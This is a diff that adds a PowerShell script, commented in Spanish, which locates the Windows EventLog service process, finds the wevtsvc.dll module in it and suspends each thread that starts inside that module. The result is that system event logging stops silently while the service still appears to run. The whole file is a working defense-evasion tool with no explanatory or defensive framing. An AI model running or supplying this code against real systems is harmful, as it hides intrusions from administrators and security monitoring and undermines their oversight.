@@ -1,0 +1,103 @@
+# Agregar funciones API de Windows necesarias
+Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+
+    public class Win32API {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool CloseHandle(IntPtr hObject);
+
+        [DllImport("psapi.dll", SetLastError = true)]
+        public static extern bool EnumProcessModules(IntPtr hProcess, IntPtr[] lphModule, uint cb, out uint lpcbNeeded);
+
+        [DllImport("psapi.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern uint GetModuleBaseName(IntPtr hProcess, IntPtr hModule, [Out] char[] lpBaseName, uint nSize);
+
+        [DllImport("psapi.dll", SetLastError = true)]
+        public static extern bool GetModuleInformation(IntPtr hProcess, IntPtr hModule, out MODULEINFO lpmodinfo, uint cb);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        public static extern uint NtQueryInformationThread(IntPtr threadHandle, int threadInformationClass, out ulong threadStartAddress, uint threadInformationLength, IntPtr returnLength);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern uint SuspendThread(IntPtr hThread);
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct MODULEINFO
+    {
+        public IntPtr lpBaseOfDll;
+        public uint SizeOfImage;
+        public IntPtr EntryPoint;
+    }
+"@
+
+# Variables
+$MAXIMUM_ALLOWED = 0x02000000
+$TH32CS_SNAPTHREAD = 0x00000004
+$THREAD_QUERY_INFORMATION = 0x0040
+$THREAD_SUSPEND_RESUME = 0x0002
+$ntQueryInfoThreadClass = 9
+
+# Abrir el manejador del servicio EventLog
+$sc = Get-Service -Name 'EventLog'
+$servicePID = (Get-WmiObject -Query "SELECT ProcessId FROM Win32_Service WHERE Name='EventLog'").ProcessId
+$serviceProcessHandle = [Win32API]::OpenProcess($MAXIMUM_ALLOWED, $false, $servicePID)
+
+# Obtener los módulos cargados por svchost.exe
+$modules = New-Object IntPtr[] 256
+$modulesSizeNeeded = 0
+$moduleInfo = [MODULEINFO]::new()
+# Tamaño de los módulos
+$modulesSize = [System.Runtime.InteropServices.Marshal]::SizeOf([type][IntPtr])
+$moduleCount = 0
+$remoteModuleName = New-Object char[] 128
+
+if ([Win32API]::EnumProcessModules($serviceProcessHandle, $modules, $modules.Length * $modulesSize, [ref]$modulesSizeNeeded)) {
+    $moduleCount = $modulesSizeNeeded / $modulesSize
+    for ($i = 0; $i -lt $moduleCount; $i++) {
+        $moduleHandle = $modules[$i]
+        $baseNameLength = [Win32API]::GetModuleBaseName($serviceProcessHandle, $moduleHandle, $remoteModuleName, $remoteModuleName.Length)
+
+        if ([string]::Join("", $remoteModuleName[0..($baseNameLength - 1)]) -eq "wevtsvc.dll") {
+            Write-Host "Módulo Windows EventLog encontrado en" $moduleHandle
+
+            # Obtener la información del módulo
+            if ([Win32API]::GetModuleInformation($serviceProcessHandle, $moduleHandle, [ref]$moduleInfo, [uint32][System.Runtime.InteropServices.Marshal]::SizeOf([MODULEINFO]))) {
+                Write-Host "Base del módulo: " $moduleInfo.lpBaseOfDll
+            }
+        }
+    }
+}
+
+# Enumerar los hilos del proceso
+$threads = Get-WmiObject -Query "SELECT * FROM Win32_Thread WHERE ProcessHandle = '$servicePID'"
+foreach ($thread in $threads) {
+    $threadHandle = [Win32API]::OpenThread($THREAD_QUERY_INFORMATION -bor $THREAD_SUSPEND_RESUME, $false, [uint32]$thread.Handle)
+
+    if ($threadHandle -ne [IntPtr]::Zero) {
+        $threadStartAddress = 0
+        [Win32API]::NtQueryInformationThread($threadHandle, $ntQueryInfoThreadClass, [ref]$threadStartAddress, [uint32][System.Runtime.InteropServices.Marshal]::SizeOf([UInt64]), [IntPtr]::Zero)
+        
+        # Comprobar si la dirección de inicio del hilo está dentro del rango del módulo wevtsvc.dll
+        if ($threadStartAddress -ge [UInt64]$moduleInfo.lpBaseOfDll.ToInt64() -and $threadStartAddress -le [UInt64]($moduleInfo.lpBaseOfDll.ToInt64() + $moduleInfo.SizeOfImage)) {
+            Write-Host "Suspendiendo hilo $($thread.Handle) con dirección de inicio $([System.Convert]::ToString($threadStartAddress, 16))"
+            
+            # Suspender el hilo
+            [Win32API]::SuspendThread($threadHandle)
+            Start-Sleep -Seconds 2
+        }
+
+        # Cerrar el manejador del hilo
+        [Win32API]::CloseHandle($threadHandle)
+    }
+}
+
+# Cerrar el manejador del proceso del servicio
+[Win32API]::CloseHandle($serviceProcessHandle)
